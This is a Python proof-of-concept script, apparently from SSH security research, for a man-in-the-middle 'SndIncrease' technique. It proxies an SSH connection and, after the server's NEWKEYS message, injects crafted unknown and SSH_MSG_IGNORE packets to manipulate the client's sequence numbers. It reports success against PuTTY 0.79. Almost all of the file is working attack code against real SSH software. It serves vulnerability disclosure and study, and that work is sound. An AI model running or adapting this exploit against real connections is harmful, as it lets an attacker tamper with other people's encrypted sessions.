#!/usr/bin/python3
from binascii import unhexlify
from common import contains_newkeys, run_tcp_mitm
from tqdm import trange
from time import sleep

#####################################################################################
## Proof of Concept for the SndIncrease technique                                  ##
##                                                                                 ##
## Tested successfully against:                                                    ##
## - PuTTY 0.79 (OpenSSH 9.4p1 Server)                                             ##
##                                                                                 ##
## Tested unsuccessfully:                                                          ##
## - AsyncSSH / libssh (Timeouts)                                                  ##
## - OpenSSH (Wrap-Around Detection)                                               ##
## - dropbear (Disconnect on unknown message)                                      ##
##                                                                                 ##
## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
#####################################################################################

# IP and port for the TCP proxy to bind to
PROXY_IP = '127.0.0.1'
PROXY_PORT = 2222

# IP and port of the server
SERVER_IP = '127.0.0.1'
SERVER_PORT = 22

# C.Snd will be increased 1
N = 1

rogue_unknown_msg = unhexlify('0000000C060900000000000000000000')
rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
technique_in_progress = False
def inject_sndincrease(in_socket, out_socket):
    global technique_in_progress
    try:
        while True:
            data = in_socket.recv(4096)
            if contains_newkeys(data):
                print("[+] SSH_MSG_NEWKEYS sent by server identified!")
                technique_in_progress = True
                print(f"[+] Injecting {N} unknown messages to increase C.Snd by {N}!")
                for _ in trange(N):
                    out_socket.send(rogue_unknown_msg)
                print(f"[+] Injecting 2**32 - {N} SSH_MSG_IGNORE to fix C.Rcv!")
                for _ in trange(2**32 - N):
                    out_socket.send(rogue_msg_ignore)
                print("[+] Injection done, waiting 3 seconds before continuing to forward traffic.")
                # Rough workaround to avoid forwarding any unimplemented messages to the server
                sleep(3)
                technique_in_progress = False
            if len(data) == 0:
                break
            out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

def pipe_discard_during_technique(in_socket, out_socket):
    global technique_in_progress
    try:
        while True:
            # PuTTY does not send SSH_MSG_NEWKEYS until the servers SSH_MSG_NEWKEYS has been received. So don't dropping it here.
            data = in_socket.recv(4096)
            if len(data) == 0:
                break
            if not technique_in_progress:
                out_socket.send(data)
    except ConnectionResetError:
        print("[!] Socket connection has been reset. Closing sockets.")
    except OSError:
        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
    in_socket.close()
    out_socket.close()

if __name__ == '__main__':
    print("--- Proof of Concept for SndIncrease technique ---")
    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
    run_tcp_mitm(PROXY_IP, PROXY_PORT, SERVER_IP, SERVER_PORT, forward_server_to_client=inject_sndincrease, forward_client_to_server=pipe_discard_during_technique)
